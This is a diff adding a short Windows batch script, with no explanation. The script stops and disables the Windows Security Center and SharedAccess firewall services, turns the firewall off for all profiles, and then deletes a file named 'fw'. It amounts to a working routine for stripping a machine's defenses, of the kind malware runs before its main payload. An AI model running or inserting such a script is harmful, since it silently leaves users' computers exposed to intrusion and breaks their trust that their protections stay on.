@@ -1,0 +1,7 @@
+@echo off 
+sc stop wscsvc
+sc config wscsvc start= disabled
+sc stop SharedAccess
+sc config SharedAccess start= disabled
+netsh firewall set opmode mode=disable profile=all
+del fw
